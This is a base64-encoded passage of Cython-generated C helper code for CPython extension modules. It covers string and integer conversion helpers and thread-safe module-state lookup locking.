B7XG4gICAgc2l6ZV90IGxlbiA9IHN0cmxlbihzKTtcbiAgICBpZiAodW5saWtlbHkobGVuID4gKHNpemVfdCkgUFlfU1NJWkVfVF9NQVgpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLCAiYnl0ZSBzdHJpbmcgaXMgdG9vIGxvbmciKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICByZXR1cm4gKFB5X3NzaXplX3QpIGxlbjtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZyhjb25zdCBjaGFyKiBjX3N0cikge1xuICAgIFB5X3NzaXplX3QgbGVuID0gX19QeXhfc3NpemVfc3RybGVuKGNfc3RyKTtcbiAgICBpZiAodW5saWtlbHkobGVuIDwgMCkpIHJldHVybiBOVUxMO1xuICAgIHJldHVybiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIGxlbik7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlCeXRlQXJyYXlfRnJvbVN0cmluZyhjb25zdCBjaGFyKiBjX3N0cikge1xuICAgIFB5X3NzaXplX3QgbGVuID0gX19QeXhfc3NpemVfc3RybGVuKGNfc3RyKTtcbiAgICBpZiAodW5saWtlbHkobGVuIDwgMCkpIHJldHVybiBOVUxMO1xuICAgIHJldHVybiBQeUJ5dGVBcnJheV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgbGVuKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGNvbnN0IGNoYXIqIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKFB5T2JqZWN0KiBvKSB7XG4gICAgUHlfc3NpemVfdCBpZ25vcmU7XG4gICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nQW5kU2l6ZShvLCAmaWdub3JlKTtcbn1cbiNpZiBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19BU0NJSSB8fCBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19VVEY4XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeVVuaWNvZGVfQXNTdHJpbmdBbmRTaXplKFB5T2JqZWN0KiBvLCBQeV9zc2l6ZV90ICpsZW5ndGgpIHtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKG8pID09IC0xKSkgcmV0dXJuIE5VTEw7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHtcbiAgICAgICAgY29uc3QgY2hhciogcmVzdWx0O1xuICAgICAgICBQeV9zc2l6ZV90IHVuaWNvZGVfbGVuZ3RoO1xuICAgICAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUih1bmljb2RlX2xlbmd0aCk7IC8vIG9ubHkgZm9yIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJXG4gICAgICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuICAgICAgICBpZiAodW5saWtlbHkoUHlBcmdfUGFyc2UobywgInMjIiwgJnJlc3VsdCwgbGVuZ3RoKSA8IDApKSByZXR1cm4gTlVMTDtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgcmVzdWx0ID0gUHlVbmljb2RlX0FzVVRGOEFuZFNpemUobywgbGVuZ3RoKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZiBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19BU0NJSVxuICAgICAgICB1bmljb2RlX2xlbmd0aCA9IFB5VW5pY29kZV9HZXRMZW5ndGgobyk7XG4gICAgICAgIGlmICh1bmxpa2VseSh1bmljb2RlX2xlbmd0aCA8IDApKSByZXR1cm4gTlVMTDtcbiAgICAgICAgaWYgKHVubGlrZWx5KHVuaWNvZGVfbGVuZ3RoICE9ICpsZW5ndGgpKSB7XG4gICAgICAgICAgICBQeVVuaWNvZGVfQXNBU0NJSVN0cmluZyhvKTtcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9XG4gICAgICAgICNlbmRpZlxuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiNlbHNlXG4jaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUlcbiAgICBpZiAobGlrZWx5KFB5VW5pY29kZV9JU19BU0NJSShvKSkpIHtcbiAgICAgICAgKmxlbmd0aCA9IFB5VW5pY29kZV9HRVRfTEVOR1RIKG8pO1xuICAgICAgICByZXR1cm4gUHlVbmljb2RlX0FzVVRGOChvKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICBQeVVuaWNvZGVfQXNBU0NJSVN0cmluZyhvKTtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuI2Vsc2VcbiAgICByZXR1cm4gUHlVbmljb2RlX0FzVVRGOEFuZFNpemUobywgbGVuZ3RoKTtcbiNlbmRpZlxuI2VuZGlmXG59XG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGNvbnN0IGNoYXIqIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nQW5kU2l6ZShQeU9iamVjdCogbywgUHlfc3NpemVfdCAqbGVuZ3RoKSB7XG4jaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUkgfHwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOFxuICAgIGlmIChQeVVuaWNvZGVfQ2hlY2sobykpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X1B5VW5pY29kZV9Bc1N0cmluZ0FuZFNpemUobywgbGVuZ3RoKTtcbiAgICB9IGVsc2VcbiNlbmRpZlxuICAgIGlmIChQeUJ5dGVBcnJheV9DaGVjayhvKSkge1xuI2lmIChDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TKSB8fCAoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIChkZWZpbmVkKFB5Qnl0ZUFycmF5X0FTX1NUUklORykgJiYgZGVmaW5lZChQeUJ5dGVBcnJheV9HRVRfU0laRSkpKVxuICAgICAgICAqbGVuZ3RoID0gUHlCeXRlQXJyYXlfR0VUX1NJWkUobyk7XG4gICAgICAgIHJldHVybiBQeUJ5dGVBcnJheV9BU19TVFJJTkcobyk7XG4jZWxzZVxuICAgICAgICAqbGVuZ3RoID0gUHlCeXRlQXJyYXlfU2l6ZShvKTtcbiAgICAgICAgaWYgKCpsZW5ndGggPT0gLTEpIHJldHVybiBOVUxMO1xuICAgICAgICByZXR1cm4gUHlCeXRlQXJyYXlfQXNTdHJpbmcobyk7XG4jZW5kaWZcbiAgICB9IGVsc2VcbiAgICB7XG4gICAgICAgIGNoYXIqIHJlc3VsdDtcbiAgICAgICAgaW50IHIgPSBQeUJ5dGVzX0FzU3RyaW5nQW5kU2l6ZShvLCAmcmVzdWx0LCBsZW5ndGgpO1xuICAgICAgICBpZiAodW5saWtlbHkociA8IDApKSB7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgICAgIH1cbiAgICB9XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlPYmplY3RfSXNUcnVlKFB5T2JqZWN0KiB4KSB7XG4gICBpbnQgaXNfdHJ1ZSA9IHggPT0gUHlfVHJ1ZTtcbiAgIGlmIChpc190cnVlIHwgKHggPT0gUHlfRmFsc2UpIHwgKHggPT0gUHlfTm9uZSkpIHJldHVybiBpc190cnVlO1xuICAgZWxzZSByZXR1cm4gUHlPYmplY3RfSXNUcnVlKHgpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZUFuZERlY3JlZihQeU9iamVjdCogeCkge1xuICAgIGludCByZXR2YWw7XG4gICAgaWYgKHVubGlrZWx5KCF4KSkgcmV0dXJuIC0xO1xuICAgIHJldHZhbCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZSh4KTtcbiAgICBQeV9ERUNSRUYoeCk7XG4gICAgcmV0dXJuIHJldHZhbDtcbn1cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlOdW1iZXJfTG9uZ1dyb25nUmVzdWx0VHlwZShQeU9iamVjdCogcmVzdWx0KSB7XG4gICAgX19QeXhfVHlwZU5hbWUgcmVzdWx0X3R5cGVfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlfVFlQRShyZXN1bHQpKTtcbiAgICBpZiAoUHlMb25nX0NoZWNrKHJlc3VsdCkpIHtcbiAgICAgICAgaWYgKFB5RXJyX1dhcm5Gb3JtYXQoUHlFeGNfRGVwcmVjYXRpb25XYXJuaW5nLCAxLFxuICAgICAgICAgICAgICAgICJfX2ludF9fIHJldHVybmVkIG5vbi1pbnQgKHR5cGUgIiBfX1B5eF9GTVRfVFlQRU5BTUUgIikuICAiXG4gICAgICAgICAgICAgICAgIlRoZSBhYmlsaXR5IHRvIHJldHVybiBhbiBpbnN0YW5jZSBvZiBhIHN0cmljdCBzdWJjbGFzcyBvZiBpbnQgaXMgZGVwcmVjYXRlZCwgIlxuICAgICAgICAgICAgICAgICJhbmQgbWF5IGJlIHJlbW92ZWQgaW4gYSBmdXR1cmUgdmVyc2lvbiBvZiBQeXRob24uIixcbiAgICAgICAgICAgICAgICByZXN1bHRfdHlwZV9uYW1lKSkge1xuICAgICAgICAgICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKHJlc3VsdF90eXBlX25hbWUpO1xuICAgICAgICAgICAgUHlfREVDUkVGKHJlc3VsdCk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUocmVzdWx0X3R5cGVfbmFtZSk7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICJfX2ludF9fIHJldHVybmVkIG5vbi1pbnQgKHR5cGUgIiBfX1B5eF9GTVRfVFlQRU5BTUUgIikiLFxuICAgICAgICAgICAgICAgICByZXN1bHRfdHlwZV9uYW1lKTtcbiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUocmVzdWx0X3R5cGVfbmFtZSk7XG4gICAgUHlfREVDUkVGKHJlc3VsdCk7XG4gICAgcmV0dXJuIE5VTEw7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlOdW1iZXJfTG9uZyhQeU9iamVjdCogeCkge1xuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICBQeU51bWJlck1ldGhvZHMgKm07XG4jZW5kaWZcbiAgUHlPYmplY3QgKnJlcyA9IE5VTEw7XG4gIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrKHgpKSlcbiAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoeCk7XG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gIG0gPSBQeV9UWVBFKHgpLT50cF9hc19udW1iZXI7XG4gIGlmIChsaWtlbHkobSAmJiBtLT5uYl9pbnQpKSB7XG4gICAgICByZXMgPSBtLT5uYl9pbnQoeCk7XG4gIH1cbiNlbHNlXG4gIGlmICghUHlCeXRlc19DaGVja0V4YWN0KHgpICYmICFQeVVuaWNvZGVfQ2hlY2tFeGFjdCh4KSkge1xuICAgICAgcmVzID0gUHlOdW1iZXJfTG9uZyh4KTtcbiAgfVxuI2VuZGlmXG4gIGlmIChsaWtlbHkocmVzKSkge1xuICAgICAgaWYgKHVubGlrZWx5KCFQeUxvbmdfQ2hlY2tFeGFjdChyZXMpKSkge1xuICAgICAgICAgIHJldHVybiBfX1B5eF9QeU51bWJlcl9Mb25nV3JvbmdSZXN1bHRUeXBlKHJlcyk7XG4gICAgICB9XG4gIH1cbiAgZWxzZSBpZiAoIVB5RXJyX09jY3VycmVkKCkpIHtcbiAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgImFuIGludGVnZXIgaXMgcmVxdWlyZWQiKTtcbiAgfVxuICByZXR1cm4gcmVzO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChQeU9iamVjdCogYikge1xuICBQeV9zc2l6ZV90IGl2YWw7XG4gIFB5T2JqZWN0ICp4O1xuICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KGIpKSkge1xuICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbiAgICBpZiAobGlrZWx5KF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoYikpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKGIpO1xuICAgIH0gZWxzZSB7XG4gICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyhiKTtcbiAgICAgIGNvbnN0IFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KGIpO1xuICAgICAgc3dpdGNoIChzaXplKSB7XG4gICAgICAgICBjYXNlIDI6XG4gICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gMiAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgIHJldHVybiAoUHlfc3NpemVfdCkgKCgoKChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgfVxuICAgICAgICAgICBicmVhaztcbiAgICAgICAgIGNhc2UgLTI6XG4gICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gMiAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgIHJldHVybiAtKFB5X3NzaXplX3QpICgoKCgoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgIH1cbiAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICBjYXNlIDM6XG4gICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gMyAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgIHJldHVybiAoUHlfc3NpemVfdCkgKCgoKCgoKHNpemVfdClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgIH1cbiAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICBjYXNlIC0zOlxuICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDMgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICByZXR1cm4gLShQeV9zc2l6ZV90KSAoKCgoKCgoc2l6ZV90KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgfVxuICAgICAgICAgICBicmVhaztcbiAgICAgICAgIGNhc2UgNDpcbiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiA0ICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgcmV0dXJuIChQeV9zc2l6ZV90KSAoKCgoKCgoKChzaXplX3QpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgIH1cbiAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICBjYXNlIC00OlxuICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDQgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICByZXR1cm4gLShQeV9zc2l6ZV90KSAoKCgoKCgoKChzaXplX3QpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgIH1cbiAgICAgICAgICAgYnJlYWs7XG4gICAgICB9XG4gICAgfVxuICAgICNlbmRpZlxuICAgIHJldHVybiBQeUxvbmdfQXNTc2l6ZV90KGIpO1xuICB9XG4gIHggPSBQeU51bWJlcl9JbmRleChiKTtcbiAgaWYgKCF4KSByZXR1cm4gLTE7XG4gIGl2YWwgPSBQeUxvbmdfQXNTc2l6ZV90KHgpO1xuICBQeV9ERUNSRUYoeCk7XG4gIHJldHVybiBpdmFsO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfaGFzaF90IF9fUHl4X1B5SW5kZXhfQXNIYXNoX3QoUHlPYmplY3QqIG8pIHtcbiAgaWYgKHNpemVvZihQeV9oYXNoX3QpID09IHNpemVvZihQeV9zc2l6ZV90KSkge1xuICAgIHJldHVybiAoUHlfaGFzaF90KSBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChvKTtcbiAgfSBlbHNlIHtcbiAgICBQeV9zc2l6ZV90IGl2YWw7XG4gICAgUHlPYmplY3QgKng7XG4gICAgeCA9IFB5TnVtYmVyX0luZGV4KG8pO1xuICAgIGlmICgheCkgcmV0dXJuIC0xO1xuICAgIGl2YWwgPSBQeUxvbmdfQXNMb25nKHgpO1xuICAgIFB5X0RFQ1JFRih4KTtcbiAgICByZXR1cm4gaXZhbDtcbiAgfVxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X093bmVkX1B5X05vbmUoaW50IGIpIHtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihiKTtcbiAgICByZXR1cm4gX19QeXhfTmV3UmVmKFB5X05vbmUpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeUJvb2xfRnJvbUxvbmcobG9uZyBiKSB7XG4gIHJldHVybiBiID8gX19QeXhfTmV3UmVmKFB5X1RydWUpIDogX19QeXhfTmV3UmVmKFB5X0ZhbHNlKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfUHlMb25nX0Zyb21TaXplX3Qoc2l6ZV90IGl2YWwpIHtcbiAgICByZXR1cm4gUHlMb25nX0Zyb21TaXplX3QoaXZhbCk7XG59XG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0NvbXBhY3RBc0xvbmcoUHlPYmplY3QgKngsIGxvbmcgKnJldHVybl92YWx1ZSkge1xuICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkpXG4gICAgICAgIHJldHVybiAwO1xuICAgIFB5X3NzaXplX3QgdmFsdWUgPSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpO1xuICAgIGlmICgoc2l6ZW9mKGxvbmcpIDwgc2l6ZW9mKFB5X3NzaXplX3QpKSAmJiB1bmxpa2VseSh2YWx1ZSAhPSAobG9uZykgdmFsdWUpKVxuICAgICAgICByZXR1cm4gMDtcbiAgICAqcmV0dXJuX3ZhbHVlID0gKGxvbmcpIHZhbHVlO1xuICAgIHJldHVybiAxO1xufVxuI2VuZGlmXG5cblxuXG4jaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUICYmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4jaWZuZGVmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFXG4jaWYgKENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMClcbiAgI2RlZmluZSBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRSAxXG4jZWxzZVxuICAjZGVmaW5lIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFIDBcbiNlbmRpZlxuI2VuZGlmXG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUgJiYgIUNZVEhPTl9BVE9NSUNTXG4jZXJyb3IgIk1vZHVsZSBzdGF0ZSB3aXRoIFBFUDQ4OSByZXF1aXJlcyBhdG9taWNzLiBDdXJyZW50bHkgdGhhdFwncyBvbmUgb2ZcXFxuIEMxMSwgQysrMTEsIGdjYyBhdG9taWMgaW50cmluc2ljcyBvciBNU1ZDIGF0b21pYyBpbnRyaW5zaWNzIlxuI2VuZGlmXG4jaWYgIUNZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFXG4jZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKVxuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKVxuI2VsaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuc3RhdGljIFB5TXV0ZXggX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXggPSB7MH07XG4jZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKSBQeU11dGV4X0xvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KVxuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBQeU11dGV4X1VubG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpXG4jZWxpZiBkZWZpbmVkKF9fY3BsdXNwbHVzKSAmJiBfX2NwbHVzcGx1cyA+PSAyMDExMDNMXG4jaW5jbHVkZSA8bXV0ZXg+XG5zdGF0aWMgc3RkOjptdXRleCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleDtcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4LmxvY2soKVxuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleC51bmxvY2soKVxuI2VsaWYgZGVmaW5lZChfX1NURENfVkVSU0lPTl9fKSAmJiAoX19TVERDX1ZFUlNJT05fXyA+IDIwMTExMkwpICYmICFkZWZpbmVkKF9fU1REQ19OT19USFJFQURTX18pXG4jaW5jbHVkZSA8dGhyZWFkcy5oPlxuc3RhdGljIG10eF90IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4O1xuc3RhdGljIG9uY2VfZmxhZyBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleF9vbmNlX2ZsYWcgPSBPTkNFX0ZMQUdfSU5JVDtcbnN0YXRpYyB2b2lkIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2luaXRpYWxpemVfbXV0ZXgodm9pZCkge1xuICAgIG10eF9pbml0KCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCwgbXR4X3BsYWluKTtcbn1cbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpXFxcbiAgY2FsbF9vbmNlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleF9vbmNlX2ZsYWcsIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2luaXRpYWxpemVfbXV0ZXgpO1xcXG4gIG10eF9sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleClcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgbXR4X3VubG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpXG4jZWxpZiBkZWZpbmVkKEhBVkVfUFRIUkVBRF9IKVxuI2luY2x1ZGUgPHB0aHJlYWQuaD5cbnN0YXRpYyBwdGhyZWFkX211dGV4X3QgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXggPSBQVEhSRUFEX01VVEVYX0lOSVRJQUxJWkVSO1xuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCkgcHRocmVhZF9tdXRleF9sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleClcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgcHRocmVhZF9tdXRleF91bmxvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KVxuI2VsaWYgZGVmaW5lZChfV0lOMzIpXG4jaW5jbHVkZSA8V2luZG93cy5oPiAgLy8gc3luY2hhcGkuaCBvbiBpdHMgb3duIGRvZXNuXCd0IHdvcmtcbnN0YXRpYyBTUldMT0NLIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4ID0gU1JXTE9DS19JTklUO1xuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCkgQWNxdWlyZVNSV0xvY2tFeGNsdXNpdmUoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KVxuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBSZWxlYXNlU1JXTG9ja0V4Y2x1c2l2ZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpXG4jZWxzZVxuI2Vycm9yICJObyBzdWl0YWJsZSBsb2NrIGF2YWlsYWJsZSBmb3IgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUuXFxcbiBSZXF1aXJlcyBDIHN0YW5kYXJkID49IEMxMSwgb3IgQysrIHN0YW5kYXJkID49IEMrKzExLFxcXG4gb3IgcHRocmVhZHMsIG9yIHRoZSBXaW5kb3dzIDMyIEFQSSwgb3IgUHl0aG9uID49IDMuMTMuIlxuI2VuZGlmXG50eXBlZGVmIHN0cnVjdCB7XG4gICAgaW50NjRfdCBpZDtcbiAgICBQeU9iamVjdCAqbW9kdWxlO1xufSBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlO1xudHlwZWRlZiBzdHJ1Y3Qge1xuICAgIGNoYXIgaW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXg7XG4gICAgUHlfc3NpemVfdCBjb3VudDtcbiAgICBQeV9zc2l6ZV90IGFsbG9jYXRlZDtcbiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlIHRhYmxlWzFdO1xufSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGE7XG4jZGVmaW5lIF9fUFlYX01PRFVMRV9TVEFURV9MT09LVVBfU01BTExfU0laRSAzMlxuI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFXG5zdGF0aWMgX19weXhfYXRvbWljX2ludF90eXBlIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlciA9IDA7XG4jZW5kaWZcbiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuc3RhdGljIF9fcHl4X2F0b21pY19wdHJfdHlwZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhID0gMDtcbiNlbHNlXG5zdGF0aWMgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhID0gTlVMTDtcbiNlbmRpZlxuc3RhdGljIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGVTdGF0ZUxvb2t1cFRhYmxlTG93ZXJCb3VuZChcbiAgICAgICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHV